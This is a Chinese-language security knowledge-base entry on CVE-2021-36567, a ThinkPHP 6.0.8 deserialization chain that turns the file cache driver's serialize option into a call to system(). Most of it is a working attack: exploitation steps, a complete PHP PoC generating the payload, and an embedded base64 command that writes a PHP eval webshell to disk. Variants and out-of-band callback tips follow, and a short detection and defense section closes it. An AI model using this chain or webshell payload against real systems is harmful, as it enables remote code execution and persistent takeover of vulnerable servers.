---
id: web-php-deserialization-thinkphp6-flysystem-cachestore-serialize-system-rce
title: ThinkPHP 6.0.8 CacheStore 链：把缓存驱动的 serialize 选项设为 system，json_encode 后的 cache 被当 shell 词执行并落马（CVE-2021-36567）
type: scenario
domain: web
path: web/php/deserialization
technique: thinkphp6-cachestore-driver-file-serialize-system
tags:
- php
- thinkphp
- deserialization
- pop-chain
- flysystem
- cache
- serialize
- system
- rce
cve:
- CVE-2021-36567
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: thinkphp<=6.0.8（Linux）
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:38:24+08:00'
  notes: 已对照原文核对：CacheStore.__destruct→save→store->set→Driver.serialize，options[serialize]=[system] 后执行 system(json_encode([[`cmd`],[]]))、Linux 反引号命令替换写 2.php 与平台差异，均与原文图16-20一致；已修正标题乱码；未验证点：getForStorage 参数个数随版本差异按原文注释保留
url: /docs/web/php/deserialization/web-php-deserialization-thinkphp6-flysystem-cachestore-serialize-system-rce/
draft: false
kb_aliases:
- CVE-2021-36567
- ThinkPHP CacheStore
- think\cache\driver\File serialize
- options serialize system
- 反序列化 system 执行
---

## 一句话结论

ThinkPHP 6.0.8 的 `think\filesystem\CacheStore` 继承 Flysystem 的 `AbstractCache`，`__destruct → save()` 会调 `$this->store->set($key, $contents)`；把 `$store` 设为 `think\cache\driver\File` 并预置 `options['serialize'] = ['system']`，`set()` 最终执行 `$serialize($data)` 即 `system(json_encode([...cache...]))`，把可控 cache 里的反引号命令交给 shell 执行（`[[\"`whoami`\"],[]]` 这类 json 在 Linux 上被 shell 当作命令替换而执行，Windows 不成立）。

## 原理

- **入口**：`League\Flysystem\Cached\Storage\AbstractCache::__destruct()` 在 `autosave` 为假时 `$this->save()`；`CacheStore` 的 `save()` 只有两步：`$contents = $this->getForStorage(); $this->store->set($this->key, $contents, $this->expire);`。
- **内容构造**：`getForStorage()` 返回 `json_encode([$cleaned, $this->complete])`（部分版本含 `expire`）。`cleanContents()` 只对数组元素做 `array_intersect_key`，所以 `cache` 设成一维数组（如 `['`echo PD9waHAg...|base64 -d > 2.php`']`）时被原样保留，最终字符串形如 `[["`cmd`"],[]]`。
- **sink 在缓存驱动的 serialize 选项**：`think\cache\driver\File::set()` 在写完目录/文件名后调用父类 `Driver` 的 `serialize($data)`；该方法取 `$serialize = $this->options['serialize'][0] ?? 'serialize'` 然后 `return $serialize($data)`。把 `options['serialize']` 设为 `['system']`，`$serialize` 就是字符串 `system`，等价于 `system('[[\"`cmd`\"],[]]')`。
- **为什么能 RCE**：`system()` 走 `/bin/sh -c`，双引号里的反引号会被 shell 解释为命令替换，先执行 `` `cmd` `` 再拼进外层；外层 `[[...],[]]` 只是无害参数。所以无回显也能执行（写文件、反弹），原文用 `echo PD9waHAg...|base64 -d > 2.php` 直接落地 WebShell。
- **平台差异**：Windows 的 cmd 不把反引号当命令替换，因此该链只在 Linux 成立（原文明确标注 Linux 系统）。
- **为什么 `complete`/`cache` 两者都能用**：`getForStorage()` 会把 `cache` 与 `complete`（以及 `expire`）一起 `json_encode`；只赋 `complete`、把 `cache` 留空数组同样能得到可控的 json 字符串，payload 更短。

## 触发条件

- 目标 ThinkPHP ≤6.0.8，且 `league/flysystem-cached-adapter` 与 `think\filesystem\CacheStore`、`think\cache\driver\File` 均存在于 classpath。
- 存在可控 `unserialize` 入口，无 `allowed_classes` 限制。
- 运行环境为 Linux（依赖 sh 的反引号命令替换）。
- `disable_functions` 未禁 `system`（或可用其它可执行回调替代）。

## 利用步骤

1. 确认版本与组件（`composer.lock` 中 `topthink/framework` ≤6.0.8、存在 flysystem-cached-adapter）。
2. 构造 payload：`CacheStore($store = think\cache\driver\File，options['serialize']=['system']、path='任意'，$key='任意'，$expire='任意')`，并把 `AbstractCache::cache` 设成含反引号命令的一维数组。
3. `serialize` + `urlencode` 后投递到反序列化点。
4. 观察是否生成文件（如 `public/2.php`）；用 WebShell 访问验证。
5. 无回显时改用带外通道：`curl`/`wget` 回连、DNSLog，或直接把 base64 的 PHP 写到 `public/`。

## PoC

```php
<?php
namespace League\Flysystem\Cached\Storage{
    abstract class AbstractCache
    {
        protected $autosave = false;
        protected $complete = [];
        protected $cache = ['`echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d > 2.php`'];
    }
}
namespace think\filesystem{
    use League\Flysystem\Cached\Storage\AbstractCache;
    class CacheStore extends AbstractCache
    {
        protected $store;
        protected $key;
        public function __construct($store,$key,$expire)
        {
            $this->key    = $key;
            $this->store  = $store;
            $this->expire = $expire;
        }
    }
}
namespace think\cache{
    abstract class Driver{}
}
namespace think\cache\driver{
    use think\cache\Driver;
    class File extends Driver
    {
        protected $options = [
            'expire'       => 0,
            'cache_subdir' => false,
            'prefix'       => false,
            'path'         => 'y4tacker',
            'hash_type'    => 'md5',
            'serialize'    => ['system'],
        ];
    }
}
namespace{
    $b = new think\cache\driver\File();
    $a = new think\filesystem\CacheStore($b,'y4tacker','1111');
    echo urlencode(serialize($a));
}
```

实际执行的命令等价于：

```text
system('[["`echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d > 2.php`"],[]]')
```

## 变体与关联

- 变体：`$serialize` 可换成 `exec`、`passthru`、`shell_exec`、`assert`、`call_user_func` 等任何接受单字符串的可调用名（`Driver::serialize` 只要求名字可被变量函数语法解析）。
- 变体：反引号也可换成 `$(...)`；内容不必放在 `cache`，放 `complete` 同样进 json。
- 关联：[[web-php-deserialization-flysystem-adapter-cache-webshell]]（同组件的另一条链，sink 是 `file_put_contents`）、[[web-php-deserialization-thinkphp6-model-destruct-checkallowfields-output-write-webshell]]（`think\session\driver\File::write` 的写文件 sink）。
- 边界：升级到 6.0.9+、Windows 环境、`disable_functions` 含 `system`、或 `File` 类的 `options` 结构变化时链失效。

## 检测与防御

- 升级 ThinkPHP 到 6.0.9+，移除 `league/flysystem-cached-adapter`。
- 不可信输入禁止对象反序列化；必须用时白名单，并禁止 `think\cache\driver\File`、`think\filesystem\CacheStore`、`League\Flysystem\*`。
- 禁止缓存驱动配置 `serialize` 为任意函数名（限制为 `serialize`/`json` 等固定白名单）；`disable_functions` 收紧。
- 检测：反序列化参数中出现 `think\filesystem\CacheStore`、`options%22%3B...serialize`、反引号或 `base64 -d` 特征；进程出现 `sh -c` 派生子进程；`public/` 出现可疑 php 文件。
